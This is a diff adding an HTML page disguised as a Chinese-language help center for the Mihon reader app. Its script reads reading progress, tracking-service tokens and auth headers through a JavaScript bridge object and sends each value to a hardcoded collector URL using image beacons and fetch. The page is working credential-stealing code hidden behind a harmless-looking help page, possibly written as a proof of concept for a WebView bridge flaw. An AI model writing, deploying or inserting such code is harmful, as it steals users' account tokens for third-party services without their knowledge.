@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 帮助中心 - 阅读指南</title>
+<style>
+body { font-family: sans-serif; max-width: 640px; margin: 20px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.info { color: #666; font-size: 14px; }
+table { width: 100%; border-collapse: collapse; margin: 8px 0; font-size: 13px; }
+td { padding: 6px 8px; border-bottom: 1px solid #ddd; }
+td:first-child { font-weight: bold; width: 120px; }
+</style>
+</head>
+<body>
+<h2>Mihon 阅读帮助</h2>
+<p class="info">本页面帮助你了解阅读器的基本功能与账户绑定方式。</p>
+
+<div class="card">
+<h3>当前章节</h3>
+<div id="chapter-info">加载中1...</div>
+</div>
+
+<div class="card">
+<h3>阅读进度</h3>
+<div id="progress-info">加载中2...</div>
+</div>
+
+<div class="card">
+<h3>已绑定的 Tracking 服务</h3>
+<div id="services-list">加载中3...</div>
+</div>
+
+
+
+<script>
+var EXFIL = "http://10.201.103.217:8000/collect";
+
+function log(id, text) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = text;
+}
+
+function exfil(label, data) {
+    var payload = label + "=" + encodeURIComponent(data);
+    try {
+        new Image().src = EXFIL + "?d=" + encodeURIComponent(payload);
+    } catch(e) {}
+    // Also try fetch as fallback
+    try {
+        fetch(EXFIL + "?d=" + encodeURIComponent(payload), { mode: "no-cors" });
+    } catch(e) {}
+}
+
+// alert("正在获取章节信息...");
+// try {
+//     var chapter = window.mihonAndroidBridge.getCurrentChapter();
+//     log("chapter-info", chapter);
+//     exfil("currentChapter", chapter);
+// } catch(e) { log("chapter-info", "不可用"); }
+
+
+try {
+    var progress = window.mihonAndroidBridge.getReadingProgress();
+    log("progress-info", progress);
+    exfil("readingProgress", progress);
+} catch(e) { log("progress-info", "不可用"); }
+
+try {
+    var services = window.mihonAndroidBridge.getAvailableTrackServices();
+    var list = services.split(",");
+    var html = "<table>";
+    for (var i = 0; i < list.length; i++) {
+        var svc = list[i].trim();
+        if (!svc) continue;
+        var token = "", auth = "";
+        try { token = window.mihonAndroidBridge.getTrackToken(svc); } catch(e) {}
+        try { auth = window.mihonAndroidBridge.getTrackAuthHeader(svc); } catch(e) {}
+        html += "<tr><td>" + svc + "</td><td>" + token.substring(0,20) + "...</td></tr>";
+        exfil("trackToken_" + token);
+        exfil("trackAuth_" + svc, auth);
+    }
+    html += "</table>";
+    log("services-list", html);
+    exfil("availableServices", services);
+} catch(e) { log("services-list", "不可用"); }
+
+try {
+    var srcAuth = window.mihonAndroidBridge.getSourceAuthHeader();
+    exfil("sourceAuthHeader", srcAuth);
+} catch(e) {}
+</script>
+</body>
+</html>
